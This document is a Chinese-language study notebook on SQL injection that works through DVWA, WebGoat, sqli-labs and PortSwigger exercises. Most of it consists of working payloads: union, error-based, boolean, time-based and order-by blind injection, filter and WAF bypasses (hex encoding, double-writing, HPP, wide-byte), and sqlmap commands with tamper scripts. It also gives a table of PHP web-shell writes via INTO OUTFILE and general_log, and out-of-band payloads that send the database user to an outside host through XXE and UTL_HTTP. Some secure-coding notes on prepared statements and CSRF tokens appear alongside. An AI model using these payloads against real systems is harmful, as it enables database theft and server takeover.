

[TOC]

# 一、知识点

## 一、DVWA

### 0. Mysql与Mariasql

	sql注入是分语言的，不同sql注入技巧也不同，比如你会mysql注入，未被会Oracle注入。如今mysql还是用的比较广泛的，sql注入也默认指的是mysql注入，而mariasql相当与mysql的开源版本，前者几乎完全兼容后者。

### 1. 单/双引号  -  十六进制编码绕过

#### **原理：**

静态内容自解码。几乎对于所有原本是使用字符串的地方/静态内容，都可以使用0x的十六进制代替，数据库会自动解码！

例：

```
SELECT username FROM Users UNION SELECT 0x61646D696E;
SELECT username FROM Users UNION SELECT 'admin';
```

| **场景**             | **是否自动解码** | **示例**                             |
| :------------------- | :--------------- | :----------------------------------- |
| 字符串比较（WHERE）  | ✅ 是             | `Name = 0x44617070657220506c7573`    |
| 字符串函数（CONCAT） | ✅ 是             | `CONCAT('A', 0x42)` → 'AB'           |
| 数值上下文           | ✅ 是（转数值）   | `ProductID = 0x31` → `ProductID = 1` |
| 动态 SQL（EXECUTE）  | ❌ 否             | 需显式调用 `UNHEX()`                 |

**动态SQL：**

	比如：SELECT username、FROM Users....，则不能编码

**注：**

	单/双引号编码绕过，不是对单/双引号进行编码，而是使用编码来代替需要单/双引号的字符串！

### 2. limit 1的绕过

后面跟条注释就行：

```sql
SELECT first_name, last_name FROM users WHERE user_id = '1' OR '1'='1' -- LIMIT 1;
```

### 3. 参数化查询绕过

#### 一、介绍

参数化查询（Prepared Statements）也叫**预编译**，能够避免SQL注入的核心原理在于 **查询结构与数据的彻底分离**。

参数化查询将SQL语句的执行分为两个独立阶段：

| 阶段         | 操作内容                                      | 关键特点                    |
| :----------- | :-------------------------------------------- | :-------------------------- |
| **准备阶段** | 发送SQL模板到数据库（含占位符如`?`或`:name`） | 数据库**编译并优化**SQL结构 |
| **执行阶段** | 发送参数值到数据库，与已编译的模板结合        | 参数**仅作为数据**处理      |

简而言之：

1. 先将模板发送到数据库，这些被当作语句解析为结构，等待数据的到来
2. 用户输入值，按照模板归坑，数据库对后来的这些参数，都以数据处理

#### 二、PDO

##### 是一种PHP实现参数化查询的机制

安全的配置：

```php
$pdo->setAttribute(PDO::ATTR_EMULATE_PREPARES, false);
$pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

$stmt = $pdo->prepare("SELECT * FROM users WHERE id = :id");
$stmt->bindValue(':id', $_GET['id'], PDO::PARAM_INT);
$stmt->execute();
```

#### 三、预编译绕过 之 结构化参数

当你的payload确认是被参数化了，而且后端又没配置错误，基本上可以跑路了。但是，预编译语句的占位符只能替换**数据值**，不能用于表名、列名等结构部分，**所以一定会遇到也一定有一些参数是没有被参数化的**，遇到这种情况，如果后端没有做严格的白名单或者字符过滤的化，那么就能得逞。

比如：order by注入就是利用肯定不是参数化的思路进行的布尔盲注，回显的排序结果差异就是判断语句执行成功与否的标准

| **位置**                | **可以参数化** | **无法参数化** | **详细说明（附案例）**                                       |
| ----------------------- | -------------- | -------------- | ------------------------------------------------------------ |
| **WHERE 条件**          | ✅ 是           | ❌ 否           | **可参数化** ✅ <br> **示例（安全）：** <br> ```SELECT * FROM users WHERE id = ?```<br> 绑定变量可防止SQL注入。 |
| **INSERT/UPDATE 值**    | ✅ 是           | ❌ 否           | **可参数化** ✅ <br> **示例（安全）：** <br> ```INSERT INTO users (name, email) VALUES (?, ?)```<br> 绑定变量可防止插入恶意数据。 |
| **ORDER BY**            | ❌ 否           | ✅ 是           | **不可参数化** ❌ <br> **示例（危险）：** <br> ```SELECT * FROM users ORDER BY ?```<br> 绑定变量在 `ORDER BY` 处无效，需使用**白名单**过滤。 |
| **GROUP BY**            | ❌ 否           | ✅ 是           | **不可参数化** ❌ <br> **示例（危险）：** <br> ```SELECT age, COUNT(*) FROM users GROUP BY ?```<br> 绑定变量不能用于 `GROUP BY`，应使用白名单。 |
| **LIMIT/OFFSET**        | ❌ 否           | ✅ 是           | **不可参数化** ❌ <br> **示例（危险）：** <br> ```SELECT * FROM users LIMIT ? OFFSET ?```<br> MySQL 允许 `CAST(? AS UNSIGNED)` 规避部分风险，但仍建议**强类型验证**。 |
| **UNION 语句**          | ❌ 否           | ✅ 是           | **不可参数化** ❌ <br> **示例（危险）：** <br> ```SELECT name FROM users UNION SELECT ?```<br> 绑定变量无法用于 `UNION`，需严格限制允许的查询结构。 |
| **表名（FROM 子句）**   | ❌ 否           | ✅ 是           | **不可参数化** ❌ <br> **示例（危险）：** <br> ```SELECT * FROM ? WHERE id = 1```<br> 表名不能参数化，需**使用白名单**限定可查询的表。 |
| **列名（SELECT 子句）** | ❌ 否           | ✅ 是           | **不可参数化** ❌ <br> **示例（危险）：** <br> ```SELECT ? FROM users```<br> 列名不能使用参数化，应采用**白名单映射**。 |
| **HAVING 子句**         | ❌ 否           | ✅ 是           | **不可参数化** ❌ <br> **示例（危险）：** <br> ```SELECT age, COUNT(*) FROM users GROUP BY age HAVING COUNT(*) > ?```<br> 需确保传入参数是**数字**，避免SQL注入。 |
| **JOIN 子句**           | ❌ 否           | ✅ 是           | **不可参数化** ❌ <br> **示例（危险）：** <br> ```SELECT users.name, orders.amount FROM users JOIN ? ON users.id = orders.user_id```<br> JOIN 目标表名不能参数化，需使用白名单。 |
| **函数名**              | ❌ 否           | ✅ 是           | **不可参数化** ❌ <br> **示例（危险）：** <br> ```SELECT ?(column) FROM users```<br> SQL 函数名不能参数化，应使用**固定查询语句**。 |
| **存储过程调用参数**    | ✅ 是           | ❌ 否           | **可参数化** ✅ <br> **示例（安全）：** <br> ```CALL getUser(?)```<br> 绑定变量可用于存储过程调用，确保输入安全。 |
| **动态 SQL 语句**       | ❌ 否           | ✅ 是           | **不可参数化** ❌ <br> **示例（危险）：** <br> ```EXECUTE 'SELECT * FROM ' || ?```<br> 不能直接参数化动态 SQL，需使用**预编译查询**或严格输入校验。 |
| **预编译语句参数**      | ✅ 是           | ❌ 否           | **可参数化** ✅ <br> **示例（安全）：** <br> 预编译语句（Prepared Statements）可安全地绑定参数，如：<br> ```connection.prepare("SELECT * FROM users WHERE email = ?")``` |
| **注释（--, #）**       | ❌ 否           | ✅ 是           | **不可参数化** ❌ <br> **示例（危险）：** <br> 用户输入 `test' --` 可能导致 SQL 注释掉后续部分，需严格过滤。 |
| **LIKE 语句模式匹配**   | ✅ 是           | ❌ 否           | **可参数化** ✅ <br> **示例（安全）：** <br> ```SELECT * FROM users WHERE name LIKE ?```<br> 但需注意 `%` 的处理，例如 `LIKE CONCAT('%', ?, '%')`。 |

### 4. 反自动化手段 之 Anti-CSRF token

#### 静态：

首次生成会话令牌，仅仅在生成session的时候生成token

```php
// 当用户首次访问或会话开始时（通常在页面顶部或初始化脚本中）
function generateSessionToken() {
    if (empty($_SESSION['session_token'])) {
        $_SESSION['session_token'] = bin2hex(random_bytes(32)); // 生成32字节随机令牌
    }
    return $_SESSION['session_token'];
}

// 示例：在页面加载时生成令牌（如HTML表单页）
generateSessionToken(); // 赋值给 $_SESSION['session_token']
```

只要页面不刷新，token就不过期，窃取到这个就能批量跑了。这一招针对CSRF还是可以的，因为你难获取受害者的token，但是针对自己想要自动化测试，那么直接拿到token就行了。

#### 动态：

在比对完token之后，再随机生成，每次提交完表单，token都会变，难以批量测试，对盲注影响很大！

```php
function checkToken() {
    if (hash_equals($_SESSION['session_token'], $_REQUEST['user_token'])) {
        $_SESSION['session_token'] = bin2hex(random_bytes(32)); // 重新生成
        return true;
    }
    return false;
}
```

### 5. SQL注入分类

#### 一、回显注入

##### 普通回显：

1. SQL语句执行的result直接可以回显看见

技巧：

	使用union select 1,2,3...，直接看1,2,3..这些数字哪个回显在哪里，然后用函数替换就行

##### 报错回显：

 	1. 语句正确执行result不回显，执行发送错误回显
 	 1. 这里的错误不是语句语法错误，而是语义错误，是执行了然后报错，不是压根就是错误的语句执行不了
 	2. 报错的输出是可控的，而不是固定死的

#### 二、盲注

**布尔Blind：**

	不是回显result，而是你可以通过回显知道，SQL语句执行成功还是失败

**时间Blind：**

	管语句执行成功还是失败，都返回相同结果，或者丫的直接不跟你回显了
	
	有回显我们可以通过回显时间判断，无回显则可以通过返回包的响应时间来判断

----

#### **回显细节：**

	像XSS一样，我们寻找的注入点和注意的回显都不是当指的页面，而是针对请求包和放回包，可能回显没有在返回体里，而是在其他地方，也可以回显在返回体里，但是没有显示在页面里。

## 二、WebGoat

### 1. sqlmap的使用

1. 只推荐用 -r 参数**从文件加载 HTTP 请求**

2. 推荐指定 --technique 参数，具体的注入方法，为了**加快注入效率**

   | **标识符** | **技术名称**                         |
   | ---------- | ------------------------------------ |
   | `B`        | 布尔盲注 (Boolean-based Blind)       |
   | `E`        | 报错注入 (Error-based Injection)     |
   | `U`        | 联合查询注入 (UNION-based Injection) |
   | `S`        | 堆叠注入 (Stacked Queries)           |
   | `T`        | 时间盲注 (Time-based Blind)          |

3. 注入参数的指定

   1. -p 只注入

      ```
      python3 sqlmap.py -r request.txt -p "username,password"
      ```

   2. *在txt文件中

      ```
      POST /search.php HTTP/1.1
      Host: example.com
      Content-Type: application/x-www-form-urlencoded
      
      id=1*&name=admin*
      ```

4. --level与参数的指定，**优先级 > -p / ***，建议为默认，这样可控！

   | 影响范围                    | `--level=1` (默认) | `--level=2+` | `--level=3+` | `--level=4+` | `--level=5` |
   | --------------------------- | ------------------ | ------------ | ------------ | ------------ | ----------- |
   | **测试参数（如 `id`）**     | ✅                  | ✅            | ✅            | ✅            | ✅           |
   | **Cookie 参数**             | ❌                  | ✅            | ✅            | ✅            | ✅           |
   | **User-Agent / Referer 头** | ❌                  | ❌            | ✅            | ✅            | ✅           |
   | **测试 JSON/XML 数据**      | ❌                  | ❌            | ❌            | ✅            | ✅           |
   | **更复杂的 payload**        | ❌                  | ✅            | ✅            | ✅            | ✅           |

5. --risk，控制注入payload危险程度：查询 -> 修改 -> 删除，建议默认！

   | **影响范围**                                           | **--risk=1 (默认)** | **--risk=2+** | **--risk=3+** |
   | ------------------------------------------------------ | ------------------- | ------------- | ------------- |
   | **安全的 payload（如 `AND 1=1`）**                     | ✅                   | ✅             | ✅             |
   | **可能影响数据库的数据（如 `INSERT`、`UPDATE`）**      | ❌                   | ✅             | ✅             |
   | **高风险操作（如 `DROP TABLE`、`DELETE`）**            | ❌                   | ❌             | ✅             |
   | **更复杂的 `UNION SELECT` payload**                    | ✅                   | ✅             | ✅             |
   | **基于时间的 SQL 注入（如 `SLEEP()`、`BENCHMARK()`）** | ✅                   | ✅             | ✅             |
   | **使用 `;` 执行多个 SQL 语句（堆叠注入）**             | ❌                   | ✅             | ✅             |
   | **文件操作（如 `LOAD_FILE()` 读取文件）**              | ❌                   | ✅             | ✅             |
   | **影响系统级的 SQL（如 `xp_cmdshell` 执行系统命令）**  | ❌                   | ❌             | ✅             |

6. --proxy参数，建议配置，指定bp代理监控数据 + 指定代理节点防止真实IP被封

   ```
   python3 sqlmap.py -r request.txt --proxy="http://127.0.0.1:8080"
   ```

7. --tamper参数，对payload的编码，绕过WAF，指定脚本都是自带的，也可以自写

   ```
   python3 sqlmap.py -r request.txt --tamper=space2comment
   ```

   | **Tamper 脚本**           | **功能描述**                                         |
   | ------------------------- | ---------------------------------------------------- |
   | `space2comment`           | **空格转换为 SQL 注释** (`/**/`)，绕过拦截空格的 WAF |
   | `randomcase`              | **随机大小写**，绕过基于大小写匹配的 WAF             |
   | `charencode`              | **URL 编码特殊字符**，避免直接被拦截                 |
   | `apostrophemask`          | **替换单引号** (`'`)，绕过 WAF 对引号的拦截          |
   | `between`                 | **使用 `BETWEEN` 替代 `=` 进行条件判断**             |
   | `equaltolike`             | **用 `LIKE` 替代 `=` 进行条件查询**                  |
   | `greater`                 | **用 `>` 替换 `=`，适用于数值型字段绕过 WAF**        |
   | `ifnull2ifisnull`         | **用 `IF(ISNULL())` 替换 `IFNULL()`**                |
   | `modsecurityversioned`    | **绕过 ModSecurity WAF 规则的特定变形**              |
   | `multiplespaces`          | **在 SQL 语句中插入多个空格** 以绕过基于空格的检测   |
   | `nonrecursivereplacement` | **用 `REPLACE()` 进行字符串替换**                    |
   | `percentage`              | **用 `%` 替换某些字符，以绕过关键字检测**            |
   | `space2plus`              | **用 `+` 替换空格，常用于 URL 传参**                 |
   | `space2dash`              | **用 `--`（单行注释）替换空格**                      |
   | `unionalltounion`         | **用 `UNION` 代替 `UNION ALL`**                      |
   | `unmagicquotes`           | **绕过 `magic_quotes` 机制的转义**                   |
   | `uppercase`               | **将 SQL 关键字转换为大写**                          |
   | `varnish`                 | **绕过 Varnish 反向代理的 SQL 过滤规则**             |

8. --dbms，指定数据库，加快注入效率，建议配置

   ```
   python3 sqlmap.py -r request.txt --dbms=mysql
   ```

9. --random-agent，推荐指定随机UA头，减少被风控几率

#### 总结：

1. BP复制请求包，保存->request.txt，插入*指定注入参数，如果很少就不需要，直接-p指定就行

2. 执行

   ```
   python3 sqlmap.py -r request.txt -p "xxx,xxx" --technique=xxx --dbms=xxx --proxy="BP地址,代理地址" --random-agent --tamper=xxx,xxx
   ```

   ```
   python sqlmap.py -r request.txt -p "ID" --random-agent --tamper=space2comment
   ```

#### 2. JAVA的参数化查询 之 JDBC

在 Java 中，预编译 SQL 语句的机制主要通过 **JDBC（Java Database Connectivity）** 的 **`PreparedStatement`** 接口实现。

```java
// 使用 try-with-resources 自动关闭资源（Java 7+）
try (Connection conn = DriverManager.getConnection(DBURL, DBUSER, DBPW);      // 自动关闭连接
     PreparedStatement ps = conn.prepareStatement("select * from users where name=?")) { // 自动关闭Statement
    
    ps.setString(1, "zy");  // 参数化赋值
    
    try (ResultSet rs = ps.executeQuery()) {  // 自动关闭ResultSet
        // 处理查询结果
        while (rs.next()) {
            String username = rs.getString("name");
            System.out.println("User: " + username);
        }
    }
    
} catch (SQLException e) {  // 精准捕获数据库异常
    e.printStackTrace();    // 实际应记录日志或处理异常
    System.out.println("数据库操作失败: " + e.getMessage());
}
```

## 三、sqli labs

### 1. 判断字符型还是数值型

```
输入:
	正常内容' --+
		正常 -> 字符
		报错 -> 数字
```

### 2. 判断列数的两种办法

```
?id=1' union select 1,2,3,4 --+
?id=1' order by 4 --+
```

### 3. 普通回显注入 - 步骤

1. 确定列数与回显与否

   ```
   ?id=1' union select 1,2,3,...--+
   ```

2. inforamtion_schema 查当前数据库中 所有表

   ```
   id=-1' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema= database()),3--+
   ```

3. inforamtion_schema 查看当前数据库 所有表的 所有字段 （因为你不知道在哪张表里）

   ```
   id=-1' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema= '表1'),3--+
   ```

   ```
   id=-1' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema= '表2'),3--+
   ```

   ....

4. 有了每张表的名称，字段，想查什么查什么

   ```
   ?id=-1 union select 1,group_concat(concat_ws(0x3a,username,password)),3 from security.users --+
   ```

#### 细节：group_concat(concat_ws(0x3a 的作用

假如表是：

```
username | password
---------|----------
admin    | admin123
user1    | pass1234
```

查询结果：

```
admin:admin123,user1:pass1234
```

为什么是0x3a:

	是':'的16进制/ascii编码，前面说了，sql中任何原本可以是字符串的静态内容，都可以使用16进制编码，因为会自动解码，编码是为了以防后端对'、:进行过滤。

### 4. 报错回显注入

#### 一、extractvalue

```
-- 正常用法
SELECT EXTRACTVALUE('<a><b>X</b><b>Y</b></a>', '//b[1]');  -- 返回 'X'
其中第一个是XML文档、第二个是XPATH表达式
```

当提供的 XPath 表达式无效时会出现此错误：

```
ERROR 1105 (HY000): XPATH syntax error: 'invalid expression'
```

比如：

```
SELECT EXTRACTVALUE('<a><b>X</b><b>Y</b></a>', '~b~');
```

```
ERROR 1105 (HY000): XPATH syntax error: '~b~'
```

可是为什么：

```
?id=1' and extractvalue(1,concat(0x7e,(select database()),0x7e))--+ 
```

不报：

```
ERROR 1105 (HY000): XPATH syntax error: 'concat(0x7e,(select database()),0x7e)‘
```

而是报：

```
ERROR 1105 (HY000): XPATH syntax error: '~database.name~‘
```

**原因：**

	extractvalue在执行之前会将参数中XPATH表达式先执行，然后再用结果去匹配XML，报错的时候invalid expression是执行后的结果，而不是原始的XPATH表达式。

##### 注入步骤：

1. 发现普通回显不行
2. 找到一个能够报错回显的函数
3. 走普通回显注入步骤

##### 其他类似函数：

```
updatexml(1,(select substr((group_concat(username,0x7e,password)),1,32) from users),1) --+
```

### 5. 导入导出文件

#### 一、说明

	mysql支持通过sql语句进行导入/导出文件，导入的话就直接可以 sqli -> webshell了，而导出的话也可以读取服务器上很多敏感的配置文件。

#### 二、条件

```
1. 权限为root
2. secure_file_priv=空
3. 知道网站的物理路径 | 因为导入导出文件是必须要绝对路径的MySQL不接受相对路径
```

#### 三、判断

1. 判断是否是root连接 

  ```
SELECT CURRENT_USER(), USER();
  ```

2. 判断secure_file_priv是否为空 **| 不是NULL，NULL就是绝对禁止导入/导出**

  ```
SHOW VARIABLES LIKE 'secure_file_priv';
  ```

  `secure-file-priv` 参数，它是一个启动时加载的只读变量，不允许连接中修改，只能通过**my.cnf/ini**文件修改，然后重新启动mysql。

#### 四、执行

	如果非常幸运条件都满足，尝试导入一句话木马

```
SELECT 1 INTO OUTFILE '/var/www/html/shell.php' LINES TERMINATED BY '<?php @eval($_POST[cmd]);?>';
```

```
select 1,"<?php @eval($_POST[cmd]);?>",3 into outfile "F:\\PHPstudy\\phpstudy_pro\\WWW\\aaa.php" --+
```

### 6. 布尔手工盲注步骤

#### 一、确定猜的目标的长度

```
?id=1' and (select length(database())>1) and 1=1  --+ true
?id=1' and (select length(database())>10) and 1=1  --+  flase
?id=1' and (select length(database())>5) and 1=1  --+ true
?id=1' and (select length(database())>6) and 1=1  --+ true
?id=1' and (select length(database())>8) and 1=1  --+ flase
```

#### 二、逐个字符猜下去

猜第一个字符：

```
?id=1' and ((select ascii(substr(database(),1,1)))>100) and 1=1 --+ true
?id=1' and ((select ascii(substr(database(),1,1)))>200) and 1=1 --+ flase
...
?id=1' and ((select ascii(substr(database(),1,1)))>114) and 1=1 --+ true 
?id=1' and ((select ascii(substr(database(),1,1)))>116) and 1=1 --+ false
```

猜第二个字符：

```
?id=1' and ((select ascii(substr(database(),2,1)))>100) and 1=1 --+ true
?id=1' and ((select ascii(substr(database(),2,1)))>200) and 1=1 --+ flase
...
?id=1' and ((select ascii(substr(database(),2,1)))>114) and 1=1 --+ true 
?id=1' and ((select ascii(substr(database(),2,1)))>116) and 1=1 --+ false
```

....

猜完目标长度。

### 7. 时间盲注手工步骤

#### 一、类比

报错回显注入的步骤 = 找到一个合适的报错函数，插入可控的报错payload + 普通回显注入步骤

**同理：**

时间盲注手工步骤 = 找到一个可以通过条件控制延时的函数/结构化语句，将布尔盲注的payload插入条件中 + 布尔盲注手工步骤

#### 二、常见条件延时语句

```
语法：IF(condition, value_if_true, value_if_false)
```

**例:**

```
?id=1' and if(length(database())=1,sleep(5),1)--+ 延时
```

### 8. 关于注释的选择：# 还是 --+

##### 建议：#只使用与post参数/http头、--+只使用与url参数/get请求

```
因为--后面必须跟一个+也就是空格的url编码注释才能生效，而post参数中，只有content-type=application/x-www-form-urlencoded的情况才会url编码，也就是没问题，但是如果是其他情况就会出错。
```

所以post使用#一定不会出错，而url/get使用--+也一定不会出错！

### 9. 特殊字符转义的绕过 之 二次注入

#### 一、与编码绕过的关联

	之前提到对于'、"的转义或者过滤可以使用16禁止编码绕过。但是这个只是针对与静态内容，比如原本就是字符串或者数值。并且编码是不包括引号本身的。
	
	而二次注入对'等特殊字符的转义的绕过是针对结构化参数，这个'的作用就是用于闭合的，而不是用于字符串！

#### 二、二次注入原理

```
用户输入 → PHP转义 → 构建SQL → MySQL解析 → 存储纯数据
"admin'" → "admin\'" → "INSERT...('admin\')" → 解析为"admin'" → 存储"admin'"
```

	显然，二次注入是用于绕过对**特殊字符的转义**，一定得是转义，不能是置空或者其他过滤！不管是对于老的过滤函数还是新的参数化处理，对特殊字符的处理都是转义。

##### 成功条件：

	对从 数据库直接读出的参数 过滤不严格

比如：

1. 如果后端采用的是参数化查询
   1. 对于可以参数化的静态内容，没有全部参数化查询处理
   2. 对于不可以参数化的结构参数，没有额外使用转义函数进行转义就插入语句执行
2. 没有采用参数化查询
   1. 从任何地方读出的参数没有进行转义就插入语句执行，都有注入风险

```php
$username= $_SESSION["username"];
$curr_pass= mysql_real_escape_string($_POST['current_password']);
$pass= mysql_real_escape_string($_POST['password']);
$re_pass= mysql_real_escape_string($_POST['re_password']);

if($pass==$re_pass)
{	
    $sql = "UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' ";
```

其中username就有二次注入风险！

### 10. 部分特殊字符黑名单过滤绕过思路

#### 常见黑名单过滤处理：

```php
function blacklist($id)
{
	$id= preg_replace('/or/i',"", $id);			//strip out OR (non case sensitive)
	$id= preg_replace('/and/i',"", $id);		//Strip out AND (non case sensitive)
	$id= preg_replace('/[\/\*]/',"", $id);		//strip out /*
	$id= preg_replace('/[--]/',"", $id);		//Strip out --
	$id= preg_replace('/[#]/',"", $id);			//Strip out #
	$id= preg_replace('/[\s]/',"", $id);		//Strip out spaces
	$id= preg_replace('/[\/\\\\]/',"", $id);		//Strip out slashes
	return $id;
}
```

1. 大小写不敏感绕过 | sql是大小写不敏感的

   ```
   如：or可以使用Or；and可以使用And绕过
   ```

   注：正则 /i 表示大小写不区分，这里就没用了

2. 双写绕过

   ```
   preg_replace('/or/i', "", $id) 
   ```

   为什么**不能是oror：而是oorr**，关键在于正则表达式的匹配行为：它从左到右扫描字符串，找到一个匹配后，会跳过已匹配的部分，继续寻找下一个非重叠的匹配。

3. 空格 过滤 绕过

   1. 使用() | 在 SQL 解析器的规则下，某些情况下 括号 () 可以充当空格的作用

      ```
      SELECT( * )FROM(users)WHERE(username='admin')AND(password='123456');
      ```

   2. 使用换行符代替 | 数据库引擎通常将换行符视为空格

      ```sql
      SELECT * FROM users WHERE id = '100'\nUNION\nSELECT 1,2,3
      SELECT * FROM users WHERE id = '100'\r\nUNION\r\nSELECT 1,2,3 
      ```

### 11. HPP 绕过 WAF

**HPP = http请求的参数污染注入**

#### 一、WAF与后端参数解析的三种模式

| **模式类型**    | **检测策略**         | **可被 HPP 绕过** | **性能影响** | **Nginx** | **Apache** | **Tomcat** | **Spring Boot** |
| --------------- | -------------------- | ----------------- | ------------ | --------- | ---------- | ---------- | --------------- |
| **Last-Value**  | 只检查最后出现的参数 | ✅ **可绕过**      | 🔹 **低**     | ✅ 默认    | ✅ 默认     | ✅ 默认     | ✅ 默认          |
| **First-Value** | 只检查第一个参数     | ✅ **可绕过**      | 🔹 **低**     | ❌         | ❌          | ❌          | ✅ 可配置        |
| **All-Values**  | 检查所有重复参数     | ❌ **不可绕过**    | 🔺 **高**     | ✅ 可配置  | ✅ 可配置   | ✅ 可配置   | ✅ 可配置        |

1. **Last-Value 模式**（默认模式）：大多数 Web 服务器（如 Nginx、Apache、Tomcat）默认采用，只保留**最后一个**参数值。  
   - **示例**：`id=1&id=2` 解析结果为 `id=2`  
   - **风险**：攻击者可以注入额外参数，绕过 WAF 或后端安全校验。  

2. **First-Value 模式**（较少见）：只取第一个参数值，通常需要手动配置。  
   - **示例**：`id=1&id=2` 解析结果为 `id=1`  
   - **风险**：部分 API 可能因参数覆盖导致逻辑漏洞。  

3. **All-Values 模式**（最严格）：收集**所有**相同参数值并解析成数组，避免 HPP 绕过。  
   - **示例**：`id=1&id=2` 解析结果为 `id=[1,2]`  
   - **风险**：性能开销较高，部分应用可能不兼容。  

#### 二、绕过条件

	只要WAF没有采用全解析并且和后端解析的参数不一致就会照成HPP

#### 三、XSS的利用

	显然HPP也能用在XSS中绕过WAF

### 12. 转义绕过 之 宽字节编码注入

与二次注入一样，宽字节编码也是专门针对转义绕过的！

#### 一、原理

##### 字节级解析过程

1. 输入流程：

   - 用户输入：`%BF%27` (`0xBF` + `'`的ASCII `0x27`)
   - 转义处理：系统添加反斜杠 → `%BF%5C%27` (`0xBF` + `0x5C` + `0x27`)

2. GBK解码：

   复制

   ```
   0xBF 0x5C → 汉字"縗"
   0x27 → 独立单引号
   ```

#### 二、产生条件

| 条件               | 技术细节                                                     | 示例                      |
| :----------------- | :----------------------------------------------------------- | :------------------------ |
| **双字节编码环境** | 必须使用GBK、GB2312、BIG5等编码                              | `SET NAMES 'GBK'`         |
| **有效高位字节**   | 前导字节必须在特定范围： • GBK: `0x81-0xFE` • BIG5: `0xA1-0xF9` | `0xBF`(有效) `0x70`(无效) |
| **转义函数介入**   | 存在`addslashes()`或类似函数添加`0x5C`                       | `'` → `\'`(`0x5C 0x27`)   |
| **合法字符组合**   | `0x5C`必须能与前字节组成有效字符                             | `0xBF 0x5C`→"縗"          |

### 13. 堆叠注入

#### 一、堆叠与union

1. union只能用于查询，并且受之前查询结构的影响；
2. 堆叠能执行任何sql语句。

#### 二、堆叠产生原理

1. 后端使用了例如：mysqli_multi_query的函数
2. sql语句可被闭合

### 14. 排序盲注 - 特殊的布尔盲注

#### 一、产生原理

1. payload出现在 ORDER BY后面

#### 二、注入技术

1. rank(seed)伪随机 | 不推荐因为不可靠，说是伪随机，可能不是伪的

   ```
   ORDER BY RAND(ASCII(SUBSTR(database(),1,1))>100)
   ```

   - 如果条件为真 → `RAND(1)` → 固定序列A
   - 如果条件为假 → `RAND(0)` → 固定序列B

2. 直接跟条件判断

   ```
   ORDER BY IF(ASCII(SUBSTR(database(),1,1))>100,column1,column2)
   ```

3. 降级为时间盲注

   ```
   ORDER BY IF(ASCII(SUBSTR(database(),1,1))>100,1,SLEEP(2))
   ```

   or

   ```
   ?sort=rand(if(ascii(substr(database(),1,1))>115,1,sleep(1)))
   ```

#### 三、盲注优先级

	传统布尔/排序盲注 > RAND()排序盲注 > 时间盲注

### 15. sqli webshell汇总

| 方法编号 | 写入方式                    | 示例 Payload                                                 | 描述                         |
| -------- | --------------------------- | ------------------------------------------------------------ | ---------------------------- |
| 1        | `UNION SELECT INTO OUTFILE` | `1' UNION SELECT 1,"<?php @eval($_POST['cmd'])?>" INTO OUTFILE '/var/www/html/x.php'--+` | 常规写入方式，适用于联合注入 |
| 2        | `LINES TERMINATED BY`       | `INTO OUTFILE '/var/www/html/x.php' LINES TERMINATED BY '<?php phpinfo(); ?>'--+` | 每行末尾写入 payload         |
| 3        | `LINES STARTING BY`         | `INTO OUTFILE '/var/www/html/x.php' LINES STARTING BY '<?php phpinfo(); ?>'--+` | 每行开头写入 payload         |
| 4        | `FIELDS TERMINATED BY`      | `INTO OUTFILE '/var/www/html/x.php' FIELDS TERMINATED BY '<?php phpinfo(); ?>'--+` | 字段之间插入 payload         |
| 5        | `COLUMNS TERMINATED BY`     | `INTO OUTFILE '/var/www/html/x.php' COLUMNS TERMINATED BY '<?php phpinfo(); ?>'--+` | 同上，语法变体               |
| 6        | `DUMPFILE` 写入             | `SELECT "<?php...?>" INTO DUMPFILE '/var/www/html/x.php';`   | 一次写入，无换行             |
| 7        | HEX 编码写入                | `SELECT 0x3c3f70687020... INTO OUTFILE '/var/www/html/x.php';` | 绕过 WAF 过滤关键字          |
| 8        | CONCAT 拼接写入             | `SELECT CONCAT("<?php ","eval($_POST[cmd]); ?>") INTO OUTFILE '/var/www/html/x.php';` | 拼接绕过                     |
| 9        | `general_log` 写入          | SHOW VARIABLES LIKE '%general%';<br/>SET GLOBAL general_log = ON;<br/>SET GLOBAL general_log_file = '/var/www/html/x.php';<br/>SELECT '<?php @eval($_POST["cmd"]); ?>';<br/>SET GLOBAL general_log = OFF; | 利用 MySQL 日志写入 shell    |

## 四、PortSwigger SQL

### 1. 判断数据库类型方法

| 特征项         | MySQL                 | Oracle                  | SQL Server      | PostgreSQL     | SQLite             |
| :------------- | :-------------------- | :---------------------- | :-------------- | :------------- | :----------------- |
| **注释**       | `#`, `-- `, `/* */`   | `--`, `/* */`           | `--`, `/* */`   | `--`, `/* */`  | `--`, `/* */`      |
| **字符串连接** | `CONCAT()`, `'a' 'b'` | `||`                    | `+`             | `||`           | `||`               |
| **版本查询**   | `@@version`           | `v$version`             | `@@VERSION`     | `VERSION()`    | `sqlite_version()` |
| **系统表**     | `information_schema`  | `all_tables`            | `sysobjects`    | `pg_catalog`   | `sqlite_master`    |
| **当前用户**   | `USER()`              | `SELECT user FROM dual` | `SYSTEM_USER`   | `CURRENT_USER` | -                  |
| **时间延迟**   | `SLEEP()`             | `DBMS_LOCK.SLEEP()`     | `WAITFOR DELAY` | `pg_sleep()`   | -                  |
| **错误前缀**   | "You have an error"   | "ORA-"                  | "Msg"           | "ERROR:"       | "SQLite error:"    |

### 2. SQLI数据外带 | **OOB**

#### 一、注入优先级

	普通回显注入 > 报错回显注入 > 数据外带回显注入 > 盲注（传统布尔/排序盲注 > RAND()排序盲注 > 时间盲注）

#### 二、不同数据库外带方式

| 数据库     | 外带方式           | 核心函数 / 技术            | 示例 Payload                                                 | 说明与限制                                                   |
| ---------- | ------------------ | -------------------------- | ------------------------------------------------------------ | ------------------------------------------------------------ |
| **Oracle** | XML 外部实体 (XXE) | `XMLType` + `EXTRACTVALUE` | ```sql<br>SELECT EXTRACTVALUE(xmltype('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % a SYSTEM "http://'||(SELECT user)||'.x.ceye.io/">%a;]>'), '/l') FROM dual;<br>``` | ✅ 支持 HTTP 外带，Oracle 能发外部请求，最常见方式。需要允许外网访问。 |
|            | UTL_HTTP           | `UTL_HTTP.REQUEST`         | ```sql<br>SELECT UTL_HTTP.REQUEST('http://'||(SELECT user)||'.x.ceye.io') FROM dual;<br>``` | ⚠️ 默认关闭；需要 DBA 权限开启网络访问（ACL）                 |
